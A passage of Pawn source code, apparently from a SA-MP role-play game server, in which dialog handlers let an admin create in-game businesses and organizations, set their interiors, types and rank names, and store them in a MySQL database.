		    		BusinessInfo[ IDFirme ][ bExitX ] = -2636.5781;
		    		BusinessInfo[ IDFirme ][ bExitY ] = 1402.7936;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = 906.4609;
				    BusinessInfo[ IDFirme ][ bPrice ] = 200000;
					strmid( BusinessInfo[ IDFirme ][ bName ], "Nocni klub", 0, strlen( "Nocni klub" ), 64);
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_NKLUB;
				    BusinessInfo[ IDFirme ][ bInVW ] = IDFirme;
				}
				case 15: // Diskoteka
				{
					BusinessInfo[ IDFirme ][ bInInt ] = 17;
		    		BusinessInfo[ IDFirme ][ bExitX ] = 493.439300;
		    		BusinessInfo[ IDFirme ][ bExitY ] = -24.916900;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = 1000.671875;
				    BusinessInfo[ IDFirme ][ bPrice ] = 200000;
					strmid( BusinessInfo[ IDFirme ][ bName ], "Diskoteka", 0, strlen( "Diskoteka" ), 64);
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_DISCO;
				    BusinessInfo[ IDFirme ][ bInVW ] = IDFirme;
				}
		        case 16: // Electronic Shop
				{
					BusinessInfo[ IDFirme ][ bInInt ] = 0;
		    		BusinessInfo[ IDFirme ][ bExitX ] = 1031.7322;
		    		BusinessInfo[ IDFirme ][ bExitY ] = 2662.5669;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = -46.5000;
				    BusinessInfo[ IDFirme ][ bPrice ] = 550000;
					strmid( BusinessInfo[ IDFirme ][ bName ], "Electronic Shop", 0, strlen( "Electronic Shop" ), 64);
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_ELEKTRONIK;
				    BusinessInfo[ IDFirme ][ bInVW ] = IDFirme;
				}
	            case 17: // Trafika
				{
					BusinessInfo[ IDFirme ][ bInInt ] = 0;
		    		BusinessInfo[ IDFirme ][ bExitX ] = 0;
		    		BusinessInfo[ IDFirme ][ bExitY ] = 0;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = 0;
				    BusinessInfo[ IDFirme ][ bPrice ] = 200000;
					strmid( BusinessInfo[ IDFirme ][ bName ], "Trafika", 0, strlen( "Trafika" ), 64);
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_TRAFIKA;
				    BusinessInfo[ IDFirme ][ bInVW ] = IDFirme;
				}
				case 18: // Firma za posao
				{
					BusinessInfo[ IDFirme ][ bInInt ] = 0;
		    		BusinessInfo[ IDFirme ][ bExitX ] = 0;
		    		BusinessInfo[ IDFirme ][ bExitY ] = 0;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = 0;
				    BusinessInfo[ IDFirme ][ bPrice ] = 3000000;
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_POSAO;
				    BusinessInfo[ IDFirme ][ bInVW ] = IDFirme;
				    ShowPlayerDialog( playerid, dialog_CREATEJOBBUSSINES, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id posla koji zelite za ovu firmu.\n\nID poslova:\n1. Mehanicar 2. P.Municije 3. Pilot 4. Rudar 5. Prevoznik Novca\n6. Uber Vozac 7. Proizvodjac Namjestaja", "Potvrdi", "Odustani" );
				}
				case 19: // Rent
				{
					BusinessInfo[ IDFirme ][ bInInt ] = 0;
		    		BusinessInfo[ IDFirme ][ bExitX ] = 0;
		    		BusinessInfo[ IDFirme ][ bExitY ] = 0;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = 0;
				    BusinessInfo[ IDFirme ][ bPrice ] = 400000;
					strmid( BusinessInfo[ IDFirme ][ bName ], "Rent a vehicle", 0, strlen( "Rent a vehicle" ), 64);
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_RENT;
				    BusinessInfo[ IDFirme ][ bInVW ] = IDFirme;
				}
				case 20: // ((empty))
				{
					SendErrorMessage(playerid, "Ne koristi se.");
					return 1;
				}
				case 21: // Javna Kuca
				{
					BusinessInfo[ IDFirme ][ bInInt ] = 6;
		    		BusinessInfo[ IDFirme ][ bExitX ] = -2385.0266;
		    		BusinessInfo[ IDFirme ][ bExitY ] = 999.6372;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = -20.5350;
				    BusinessInfo[ IDFirme ][ bPrice ] = 1500000;
					strmid( BusinessInfo[ IDFirme ][ bName ], "Javna Kuca", 0, strlen( "Javna Kuca" ), 64);
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_JAVNAK;
				    BusinessInfo[ IDFirme ][ bInVW ] = 0;
				}
				case 22: // Kladionica
				{
					BusinessInfo[ IDFirme ][ bInInt ] = 3;
		    		BusinessInfo[ IDFirme ][ bExitX ] = 834.6672;
		    		BusinessInfo[ IDFirme ][ bExitY ] = 7.3881;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = 1004.1870;
				    BusinessInfo[ IDFirme ][ bPrice ] = 1500000;
					strmid( BusinessInfo[ IDFirme ][ bName ], "Kladionica", 0, strlen( "Kladionica" ), 64);
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_KLAD;
				    BusinessInfo[ IDFirme ][ bInVW ] = IDFirme;
				}
				case 23: // Oglas
				{
					BusinessInfo[ IDFirme ][ bInInt ] = 0;
		    		BusinessInfo[ IDFirme ][ bExitX ] = 0;
		    		BusinessInfo[ IDFirme ][ bExitY ] = 0;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = 0;
				    BusinessInfo[ IDFirme ][ bPrice ] = 2000000;
					strmid( BusinessInfo[ IDFirme ][ bName ], "Oglas", 0, strlen( "Oglas" ), 64);
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_OGLAS;
				    BusinessInfo[ IDFirme ][ bInVW ] = 0;
				}
				case 24: // Telekom
				{
					SendErrorMessage(playerid, "Ovdje nema firme.");
					return 1;
				}
				case 25: // Pay 'n' Spray
				{
					SendErrorMessage(playerid, "Ovdje nema firme.");
					return 1;
				}
				case 26: // Komunalije
				{
					SendErrorMessage(playerid, "Ovdje nema firme.");
					return 1;
				}
				case 27: // Vodovod
				{
					SendErrorMessage(playerid, "Ovdje nema firme.");
					return 1;
				}
				case 28: // Elektrana
				{
					SendErrorMessage(playerid, "Ovdje nema firme.");
					return 1;
				}
				case 29: // Lutrija
				{
					BusinessInfo[ IDFirme ][ bInInt ] = 0;
		    		BusinessInfo[ IDFirme ][ bExitX ] = 0;
		    		BusinessInfo[ IDFirme ][ bExitY ] = 0;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = 0;
				    BusinessInfo[ IDFirme ][ bPrice ] = 2000000;
					strmid( BusinessInfo[ IDFirme ][ bName ], "Lutrija", 0, strlen( "Lutrija" ), 64);
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_LUTRIJA;
				    BusinessInfo[ IDFirme ][ bInVW ] = 0;
				}
				case 30: // Casino
				{
					BusinessInfo[ IDFirme ][ bInInt ] = 3;
		    		BusinessInfo[ IDFirme ][ bExitX ] = -2010.6362;
		    		BusinessInfo[ IDFirme ][ bExitY ] = -756.2748;
		    		BusinessInfo[ IDFirme ][ bExitZ ] = 1500.9688;
				    BusinessInfo[ IDFirme ][ bPrice ] = 1000000;
					strmid( BusinessInfo[ IDFirme ][ bName ], "Casino", 0, strlen( "Casino" ), 64);
				    BusinessInfo[ IDFirme ][ bType ] = VRSTA_CASINO;
				    BusinessInfo[ IDFirme ][ bInVW ] = IDFirme;
				}
			}
		    BusinessInfo[ IDFirme ][ bMoney ] = 0;
		    BusinessInfo[ IDFirme ][ bInt ] = GetPlayerInterior( playerid );
	        BusinessInfo[ IDFirme ][ bVW ] = GetPlayerVirtualWorld( playerid );
	        strmid( BusinessInfo[ IDFirme ][ bOwner ], "Drzava", 0, strlen( "Drzava" ), 32);

	        format( f_string, sizeof( f_string),
				"(FIRMA - [%d])\n\
				Ime: {FFFFFF}%s\n\
				{B72C40}Vlasnik: {FFFFFF}%s\n\
				{B72C40}Vrsta: {FFFFFF}%s\n\
				{B72C40}Adresa: {FFFFFF}%s\n\
				{B72C40}Neaktivnost: {FFFFFF}%dh\n\
				{B72C40}Fakture: {FFFFFF}%d", IDFirme, BusinessInfo[ IDFirme ][ bName ], BusinessInfo[ IDFirme ][ bPrice ], getBussinesType( IDFirme ), BusinessInfo[ IDFirme ][ bLevel ], UliceFirme( IDFirme ) );

			FirmaLabel[ IDFirme ] = CreateDynamic3DTextLabel( f_string, 0xB72C40FF, PozX, PozY, PozZ, 10.0, IPI, IVI, 0, -1, -1, .priority = 26);
			FirmaPickup[ IDFirme ] = CreateDynamicPickup( 1274, 1, PozX, PozY, PozZ, .priority = 26 );
			Bussines_Refresh( IDFirme );
			sql_create_bussines( IDFirme );

			SendInfoMessage( playerid, "Uspesno si kreirao firmu." );
		}
	}
	else if(dialogid == dialog_CREATEJOBBUSSINES )
	{
	    if( !response ) return 1;
	    if( response )
		{
	        new jobid, IDFirme = GetNearestBussines( playerid ), stringic[ 64 ];
		    if( sscanf( inputtext, "d", jobid ) ) return ShowPlayerDialog( playerid, dialog_CREATEJOBBUSSINES, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id posla koji zelite za ovu firmu.\n\nID poslova:\n1. Mehanicar 2. P.Municije 3. Pilot 4. Rudar 5. Prevoznik Novca\n6. Uber Vozac 7. Proizvodjac Namjestaja", "Potvrdi", "Odustani" );
			if( jobid < 1 || jobid > MAX_JOBS ) return ShowPlayerDialog( playerid, dialog_CREATEJOBBUSSINES, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id posla koji zelite za ovu firmu.\n\nID poslova:\n1. Mehanicar 2. P.Municije 3. Pilot 4. Rudar 5. Prevoznik Novca\n6. Uber Vozac 7. Proizvodjac Namjestaja", "Potvrdi", "Odustani" );

			format( stringic, sizeof( stringic ), "Firma - %s", getJobName( jobid ) );
            strmid( BusinessInfo[ IDFirme ][ bName ], stringic, 0, strlen( stringic ), 64);
            BusinessInfo[ IDFirme ][ bJobID ] = jobid;

            new q[ 144 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `bussines` SET `b_name` = '%e', `b_jobID` = '%d' WHERE `bussines_id` = '%d'", BusinessInfo[ IDFirme ][ bName ], BusinessInfo[ IDFirme ][ bJobID ], BusinessInfo[ IDFirme ][ b_ID ] );
		    mysql_tquery( mSQL, q );

			Bussines_Refresh( IDFirme );
		}
	}
	else if(dialogid == dialog_ORGCREATE )
	{
		if(!response)
		{
			ShowPlayerDialog( playerid, dialog_NAPRAVISVE, DIALOG_STYLE_LIST, D_NASLOV,
																						"{4282C0}(1). {FFFFFF}Organizacije\n\
																						{4282C0}(2). {FFFFFF}Vozila\n\
																						{4282C0}(3). {FFFFFF}Firmu\n\
																						{4282C0}(4). {FFFFFF}Kontejner\n\
																						{4282C0}(5). {FFFFFF}Kuca\n\
																						{4282C0}(6). {FFFFFF}Stan\n\
																						{4282C0}(7). {FFFFFF}Vikendica\n\
																						{4282C0}(8). {FFFFFF}Tiki\n\
																						{4282C0}(9). {FFFFFF}Bankomat\n\
																						{4282C0}(10). {FFFFFF}((empty))\n\
																						{4282C0}(11). {FFFFFF}Kapija\n\
																						{4282C0}(12). {FFFFFF}((empty))\n\
																						{4282C0}(13). {FFFFFF}((empty))\n\
																						{4282C0}(14). {FFFFFF}GPS Lokacija\n\
																						{4282C0}(15). {FFFFFF}Gang Zona\n\
																						{4282C0}(16). {FFFFFF}Poklon\n\
																						{4282C0}(17). {FFFFFF}Jelka\n\
																						{4282C0}(18). {FFFFFF}Rent", "Potvrdi", "Nazad" );
		}
	    if( response )
		{
		    new ime[ ORG_IME ], Float:PozX, Float:PozY, Float:PozZ;
		    GetPlayerPos( playerid, PozX, PozY, PozZ );
		    if(sscanf( inputtext, "s[40]", ime ) ) return ShowPlayerDialog( playerid, dialog_ORGCREATE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite zeljeno ime vase organizacije:", "Potvrdi", "Nazad");

            new orga = 0;
			for( new j = 1; j < MAX_ORG; j++ )
		 	{
				if( org_info[ j ][ oID ] == -1 )
				{
				    orga = j;
				    break;
				}
			}
			if( orga != 0 ) return SendErrorMessage( playerid, "Vec je jedna organizacija u procesu kreiranja, nije dovrsena, sacekajte(sigurnost baze)." );

            if( org_info[ (MAX_ORG-1) ][ oID ] != 0 ) return SendErrorMessage( playerid, "Vec ima maksimalan broj organizacija." );
			for( new id = 1; id < MAX_ORG; id++ )
			{
				if( org_info[ id ][ oID ] == 0 )
				{
		            strmid(org_info[ id ][ oName ], ime, 0, strlen(ime), ORG_IME);
					org_info[ id ][ oID ] = id;

                    for( new i = 0; i < 52; i++ )
					{
                        org_members_info[ id ][ i ][ o_m_type ] = 0;
                        strmid( org_members_info[ id ][ i ][ o_m_Name ], "Niko", 0, strlen( "Niko" ), MAX_PLAYER_NAME );
                        org_members_info[ id ][ i ][ o_m_sqlID ] = 0;
                    }

                    org_info[ id ][ oUbacenihClanova ] = 0;

		   			org_info[ id ][ oPozExtX ] = PozX;
				    org_info[ id ][ oPozExtY ] = PozY;
					org_info[ id ][ oPozExtZ ] = PozZ;

                    org_info[ id ][ oSpawnPoint ][ 0 ] = PozX;
					org_info[ id ][ oSpawnPoint ][ 1 ] = PozY;
					org_info[ id ][ oSpawnPoint ][ 2 ] = PozZ;

                    org_info[ id ][ oSavez ] = -1;
                    org_info[ id ][ oEntVw ] = -1;
					org_info[ id ][ oEntInt ] = -1;
					org_info[ id ][ oEntFromBussines ] = -1;
					org_info[ id ][ oBussinesID ] = -1;

					OrgKreiranje[ playerid ] = id;

					new string[ 150 ];
					format( string, sizeof( string ),
														"Organizacija - ({FFFFFF}%d{FF6200})\n\
														{FFFFFF}%s\n\n\
														{FF6200}Da udjete koristite tipku {FFFFFF}\"ENTER\"", id, org_info[ id ][ oName ] );

                    org_info[id][o3D] = CreateDynamic3DTextLabel( string, 0xFF6200FF, org_info[ id ][ oPozExtX ], org_info[ id ][ oPozExtY ], org_info[ id ][ oPozExtZ ], 5.0, IPI, IVI, 0, org_info[ id ][ oEntVw ], org_info[ id ][ oEntInt ], -1, 10.0, .priority = 30);
					org_info[id][oPickup] = CreateDynamicPickup(1314, 1, org_info[ id ][ oPozExtX ], org_info[ id ][ oPozExtY ], org_info[ id ][ oPozExtZ ], org_info[ id ][ oEntVw ], org_info[ id ][ oEntInt ], .priority = 30 );
					org_info[id][oMapIcon] = CreateDynamicMapIcon(org_info[ id ][ oPozExtX ], org_info[ id ][ oPozExtY ], org_info[ id ][ oPozExtZ ], (org_info[ id ][ oTip ] == ORG_TIP_VLADINA ? 30 : 23), -1, -1, -1, -1, 750.0);

					ShowPlayerDialog( playerid, dialog_ORGPREFIX, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite skracenicu organizacije.\nPrimer: LSPD", "Potvrdi", "Odustani" );
					break;
				}
			}
		}
	}
	else if(dialogid == dialog_ORGPREFIX && response )
	{
	    new id = GetNearestOrganization( playerid );
	    new prefix[ 10 ];
	    if( sscanf( inputtext, "s[10]", prefix ) ) return ShowPlayerDialog( playerid, dialog_ORGPREFIX, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite skracenicu organizacije.\nPrimer: LSPD", "Potvrdi", "Odustani" );
	    if( OrgKreiranje[ playerid ] == 0 )
		{
	        strmid( org_info[ id ][ oPreFix ], prefix, 0, strlen( prefix ), 5 );

	        new q[ 144 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `organizations` SET `prefix` = '%e' WHERE `org_id` = '%d' LIMIT 1", org_info[ id ][ oPreFix ], org_info[ id ][ oID ] );
			mysql_tquery( mSQL, q );

	        SendInfoMessage( playerid, "Uspesno ste promenili prefix organizacije." );
		}
		else
		{
		    strmid( org_info[ id ][ oPreFix ], prefix, 0, strlen( prefix ), 5 );

		    ShowPlayerDialog( playerid, dialog_ORGINT1, DIALOG_STYLE_LIST, D_NASLOV,
																					"{4282C0}(1). {FFFFFF}Default interior\n\
																					{4282C0}(2). {FFFFFF}Unesi sam kordinate\n\
																					{4282C0}(3). {FFFFFF}Interior bande\n\
																					{4282C0}(4). {FFFFFF}Interior mafije\n\
																					{4282C0}(5). {FFFFFF}Interior hitmana", "Potvrdi", "Odustani" );
		}
	}
	else if(dialogid == dialog_ORGINT1 && response )
	{
	    new id = GetNearestOrganization( playerid );
		switch(listitem)
		{
			case 0:
			{
		        if( OrgKreiranje[ playerid ] == 0 )
				{
		            org_info[ id ][ oPozIntX ] = 246.7840;
				 	org_info[ id ][ oPozIntY ] = 63.9002;
				 	org_info[ id ][ oPozIntZ ] = 1003.6406;
		         	org_info[ id ][ oInt ] = 6;
		         	org_info[ id ][ oVw ] = id;

	                new q[ 200 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `organizations` SET `exit_pos_x` = '%f', `exit_pos_y` = '%f', `exit_pos_z` = '%f', `interior` = '%d', `virtualw` = '%d' WHERE `org_id` = '%d' LIMIT 1",
														org_info[ id ][ oPozIntX ],
														org_info[ id ][ oPozIntY ],
														org_info[ id ][ oPozIntZ ],
														org_info[ id ][ oInt ],
														org_info[ id ][ oVw ],
														org_info[ id ][ oID ] );
					mysql_tquery( mSQL, q );

					SendInfoMessage( playerid, "Uspesno ste stavili default interior." );
				}
				else
				{
			        org_info[ id ][ oPozIntX ] = 246.7840;
				 	org_info[ id ][ oPozIntY ] = 63.9002;
				 	org_info[ id ][ oPozIntZ ] = 1003.6406;
		         	org_info[ id ][ oInt ] = 6;
		         	org_info[ id ][ oVw ] = id;

		         	ShowPlayerDialog( playerid, dialog_ORGTIP, DIALOG_STYLE_LIST, D_NASLOV,
																						 	"{4282C0}(1). {FFFFFF}Tip: PD/SD\n\
																							 {4282C0}(2). {FFFFFF}Tip: Banda\n\
																							 {4282C0}(3). {FFFFFF}Tip: Mafija\n\
																							 {4282C0}(4). {FFFFFF}Tip: Bajkeri\n\
																							 {4282C0}(5). {FFFFFF}Tip: Hitmani", "Potvrdi", "Odustani" );
				}
			}
		    case 1: ShowPlayerDialog( playerid, dialog_ORGINT2, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesi id interiora i koordinate interiora.\nPrimer: 6 246.7840 63.9002 1003.6406", "Potvrdi", "Odustani" );
			case 2:
			{
		        if( OrgKreiranje[ playerid ] == 0 )
				{
		            org_info[ id ][ oPozIntX ] = 291.5517;
				 	org_info[ id ][ oPozIntY ] = -141.1170;
				 	org_info[ id ][ oPozIntZ ] = 1161.2759;
		         	org_info[ id ][ oInt ] = 6;
		         	org_info[ id ][ oVw ] = id;

	                new q[ 200 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `organizations` SET `exit_pos_x` = '%f', `exit_pos_y` = '%f', `exit_pos_z` = '%f', `interior` = '%d', `virtualw` = '%d' WHERE `org_id` = '%d' LIMIT 1",
														org_info[ id ][ oPozIntX ],
														org_info[ id ][ oPozIntY ],
														org_info[ id ][ oPozIntZ ],
														org_info[ id ][ oInt ],
														org_info[ id ][ oVw ],
														org_info[ id ][ oID ] );
					mysql_tquery( mSQL, q );

					SendInfoMessage( playerid, "Uspesno ste stavili banda interior." );
		 		}
				else
				{
			        org_info[ id ][ oPozIntX ] = 291.5517;
				 	org_info[ id ][ oPozIntY ] = -141.1170;
				 	org_info[ id ][ oPozIntZ ] = 1161.2759;
		         	org_info[ id ][ oInt ] = 6;
		         	org_info[ id ][ oVw ] = id;

		         	ShowPlayerDialog( playerid, dialog_ORGTIP, DIALOG_STYLE_LIST, D_NASLOV,
																						 	"{4282C0}(1). {FFFFFF}Tip: PD/SD\n\
																							 {4282C0}(2). {FFFFFF}Tip: Banda\n\
																							 {4282C0}(3). {FFFFFF}Tip: Mafija\n\
																							 {4282C0}(4). {FFFFFF}Tip: Bajkeri\n\
																							 {4282C0}(5). {FFFFFF}Tip: Hitmani", "Potvrdi", "Odustani" );
				}
			}
			case 3:
			{
		        if( OrgKreiranje[ playerid ] == 0 ) 
		        {
		            org_info[ id ][ oPozIntX ] = 1934.0212;
				 	org_info[ id ][ oPozIntY ] = 280.1232;
				 	org_info[ id ][ oPozIntZ ] = 1371.4218;
		         	org_info[ id ][ oInt ] = 6;
		         	org_info[ id ][ oVw ] = id;

	                new q[ 200 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `organizations` SET `exit_pos_x` = '%f', `exit_pos_y` = '%f', `exit_pos_z` = '%f', `interior` = '%d', `virtualw` = '%d' WHERE `org_id` = '%d' LIMIT 1",
						org_info[ id ][ oPozIntX ],
						org_info[ id ][ oPozIntY ],
						org_info[ id ][ oPozIntZ ],
						org_info[ id ][ oInt ],
						org_info[ id ][ oVw ],
						org_info[ id ][ oID ] );
					mysql_tquery( mSQL, q );

					SendInfoMessage( playerid, "Uspesno ste stavili mafija interior." );
		 		}
				else
				{
			        org_info[ id ][ oPozIntX ] = 1934.0212;
				 	org_info[ id ][ oPozIntY ] = 280.1232;
				 	org_info[ id ][ oPozIntZ ] = 1371.4218;
		         	org_info[ id ][ oInt ] = 6;
		         	org_info[ id ][ oVw ] = id;

		         	ShowPlayerDialog( playerid, dialog_ORGTIP, DIALOG_STYLE_LIST, D_NASLOV,
																						 	"{4282C0}(1). {FFFFFF}Tip: PD/SD\n\
																							 {4282C0}(2). {FFFFFF}Tip: Banda\n\
																							 {4282C0}(3). {FFFFFF}Tip: Mafija\n\
																							 {4282C0}(4). {FFFFFF}Tip: Bajkeri\n\
																							 {4282C0}(5). {FFFFFF}Tip: Hitmani", "Potvrdi", "Odustani" );
				}
			}
			case 4:
			{
		        if( OrgKreiranje[ playerid ] == 0 )
				{
		            org_info[ id ][ oPozIntX ] = 390.7695;
				 	org_info[ id ][ oPozIntY ] = 173.8225;
				 	org_info[ id ][ oPozIntZ ] = 1008.3828;
		         	org_info[ id ][ oInt ] = 3;
		         	org_info[ id ][ oVw ] = id;

	                new q[ 200 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `organizations` SET `exit_pos_x` = '%f', `exit_pos_y` = '%f', `exit_pos_z` = '%f', `interior` = '%d', `virtualw` = '%d' WHERE `org_id` = '%d' LIMIT 1",
						org_info[ id ][ oPozIntX ],
						org_info[ id ][ oPozIntY ],
						org_info[ id ][ oPozIntZ ],
						org_info[ id ][ oInt ],
						org_info[ id ][ oVw ],
						org_info[ id ][ oID ] );
					mysql_tquery( mSQL, q );

					SendInfoMessage( playerid, "Uspesno ste stavili hitman interior!" );
		 		}
				else
				{
			        org_info[ id ][ oPozIntX ] = 390.7695;
				 	org_info[ id ][ oPozIntY ] = 173.8225;
				 	org_info[ id ][ oPozIntZ ] = 1008.3828;
		         	org_info[ id ][ oInt ] = 3;
		         	org_info[ id ][ oVw ] = id;

			        ShowPlayerDialog( playerid, dialog_ORGTIP, DIALOG_STYLE_LIST, D_NASLOV,
																						 	"{4282C0}(1). {FFFFFF}Tip: PD/SD\n\
																							 {4282C0}(2). {FFFFFF}Tip: Banda\n\
																							 {4282C0}(3). {FFFFFF}Tip: Mafija\n\
																							 {4282C0}(4). {FFFFFF}Tip: Bajkeri\n\
																							 {4282C0}(5). {FFFFFF}Tip: Hitmani", "Potvrdi", "Odustani" );
				}
			}
		}
	}
	else if(dialogid == dialog_ORGINT2 && response)
	{
	    new id = GetNearestOrganization( playerid ), Float:Poz[ 3 ], intid;
		if( sscanf( inputtext, "ifff", intid, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ] ) ) return ShowPlayerDialog( playerid, dialog_ORGINT2, DIALOG_STYLE_INPUT, D_NASLOV, "Unesi id interiora i kordinate interiora\n Primer: 6 246.7840 63.9002 1003.6406", "Potvrdi", "Odustani" );

		if( OrgKreiranje[ playerid ] == 0 )
		{
	    	org_info[ id ][ oPozIntX ] = Poz[ 0 ];
		 	org_info[ id ][ oPozIntY ] = Poz[ 1 ];
		 	org_info[ id ][ oPozIntZ ] = Poz[ 2 ];
	   		org_info[ id ][ oInt ] = intid;
	   		org_info[ id ][ oVw ] = id;

            new q[ 200 ];
			mysql_format( mSQL, q, sizeof(q), "UPDATE `organizations` SET `exit_pos_x` = '%f', `exit_pos_y` = '%f', `exit_pos_z` = '%f', `interior` = '%d', `virtualw` = '%d' WHERE `org_id` = '%d' LIMIT 1",
				org_info[ id ][ oPozIntX ],
				org_info[ id ][ oPozIntY ],
				org_info[ id ][ oPozIntZ ],
				org_info[ id ][ oInt ],
				org_info[ id ][ oVw ],
				org_info[ id ][ oID ] );
			mysql_tquery( mSQL, q );

			SendInfoMessage( playerid, "Uspesno ste promenili interior." );
		}
		else
		{
			org_info[ id ][ oPozIntX ] = Poz[ 0 ];
		 	org_info[ id ][ oPozIntY ] = Poz[ 1 ];
		 	org_info[ id ][ oPozIntZ ] = Poz[ 2 ];
	   		org_info[ id ][ oInt ] = intid;
	   		org_info[ id ][ oVw ] = id;

		    ShowPlayerDialog( playerid, dialog_ORGTIP, DIALOG_STYLE_LIST, D_NASLOV,
																				 	"{4282C0}(1). {FFFFFF}Tip: PD/SD\n\
																					 {4282C0}(2). {FFFFFF}Tip: Banda\n\
																					 {4282C0}(3). {FFFFFF}Tip: Mafija\n\
																					 {4282C0}(4). {FFFFFF}Tip: Bajkeri\n\
																					 {4282C0}(5). {FFFFFF}Tip: Hitmani", "Potvrdi", "Odustani" );
		}
	}
	else if(dialogid == dialog_ORGTIP && response)
	{
	    new id = GetNearestOrganization( playerid );
	    if( OrgKreiranje[ playerid ] == 0 )
		{
		    switch(listitem)
		    {
				case 0:
				{
					org_info[ id ][ oTip ] = ORG_TIP_VLADINA;
		        	sql_organization_update_integer( id, "type", org_info[ id ][ oTip ] );
		        	SendInfoMessage( playerid, "Tip: PD/SD." );
				}
				case 1:
				{
					org_info[ id][ oTip ] = ORG_TIP_BANDA;
		        	sql_organization_update_integer( id, "type", org_info[ id ][ oTip ] );
		        	SendInfoMessage( playerid, "Tip: Banda." );
				}
				case 2:
				{
					org_info[ id ][ oTip ] = ORG_TIP_MAFIJA;
		        	sql_organization_update_integer( id, "type", org_info[ id ][ oTip ] );
		        	SendInfoMessage( playerid, "Tip: Mafija." );
				}
	            case 3:
				{
					org_info[ id ][ oTip ] = ORG_TIP_BAJKERI;
		        	sql_organization_update_integer( id, "type", org_info[ id ][ oTip ] );
		        	SendInfoMessage( playerid, "Tip: Bajkeri." );
				}
		        case 4:
				{
					org_info[ id ][ oTip ] = ORG_TIP_HITMAN;
		        	sql_organization_update_integer( id, "type", org_info[ id ][ oTip ] );
		        	SendInfoMessage( playerid, "Tip: Hitmani." );
				}
			}
		}
		else
		{
		    switch(listitem)
		    {
			    case 0:
				{
					org_info[ id ][ oTip ] = ORG_TIP_VLADINA;
		        	SendInfoMessage( playerid, "Tip: PD/SD." );
				}
				case 1:
				{
					org_info[ id][ oTip ] = ORG_TIP_BANDA;

		        	SendInfoMessage( playerid, "Tip: Banda." );
				}
				case 2:
				{
					org_info[ id ][ oTip ] = ORG_TIP_MAFIJA;
		        	SendInfoMessage( playerid, "Tip: Mafija." );
				}
	            case 3:
				{
					org_info[ id ][ oTip ] = ORG_TIP_BAJKERI;
		        	SendInfoMessage( playerid, "Tip: Bajkeri." );
				}
	            case 4:
				{
					org_info[ id ][ oTip ] = ORG_TIP_HITMAN;
		        	SendInfoMessage( playerid, "Tip: Hitmani." );
				}
			}

			ShowPlayerDialog( playerid, dialog_ORGRANK1, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* U prazni prostor ispod unesite ime za rank 1 ove organizacije.", "Potvrdi", "Odustani" );
		}
		return 1;
	}
	else if(dialogid == dialog_ORGRANK1 )
	{
	    new id = GetNearestOrganization( playerid );
		new ime[ORG_RANK];
		if(sscanf(inputtext, "s[31]", ime)) return ShowPlayerDialog( playerid, dialog_ORGRANK1, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* U prazni prostor ispod unesite ime za rank 1 ove organizacije.\n\n{FF0000}Napomena: Ime ranka ne moze biti manje 4 ili vise od 30 slova.", "Potvrdi", "Odustani" );
		if(strlen(inputtext) < 4 || strlen(inputtext) > 30) 
		{
			ShowPlayerDialog( playerid, dialog_ORGRANK1, DIALOG_STYLE_INPUT, D_NASLOV, "{FF0000}* {FFFFFF}Ime ranka 1 ne moze biti manje 4 ili vise od 30 slova:", "Potvrdi", "Odustani" );
			return 1;
		}
		else {
	        if(OrgKreiranje[ playerid ] == 0 )
			{
				strmid( org_info[ id ][ oRank1 ], ime, 0, strlen(ime), ORG_RANK);
				sql_organization_update_string( id, "rank_1", org_info[ id ][ oRank1 ] );
				SendInfoMessage( playerid, "Postavili ste ime ranka na {FFFFFF}%s.", org_info[ id ][ oRank1 ] );
			}
			else
			{
			    strmid( org_info[ id ][ oRank1 ], ime, 0, strlen(ime), ORG_RANK);

				SendInfoMessage( playerid, "Postavili ste ime ranka na {FFFFFF}%s.", org_info[ id ][ oRank1 ] );
				ShowPlayerDialog( playerid, dialog_ORGRANK2, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* U prazni prostor ispod unesite ime za rank 2 ove organizacije.", "Potvrdi", "Odustani" );
			}
		}
	}
	else if(dialogid == dialog_ORGRANK2)
	{
	    new id = GetNearestOrganization( playerid );
		new ime[ORG_RANK];
		if(sscanf(inputtext, "s[31]", ime)) return ShowPlayerDialog( playerid, dialog_ORGRANK2, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* U prazni prostor ispod unesite ime za rank 2 ove organizacije.\n\n{FF0000}Napomena: Ime ranka ne moze biti manje 4 ili vise od 30 slova.", "Potvrdi", "Odustani" );
		if(strlen( inputtext ) < 4 || strlen(inputtext) > 30) 
		{
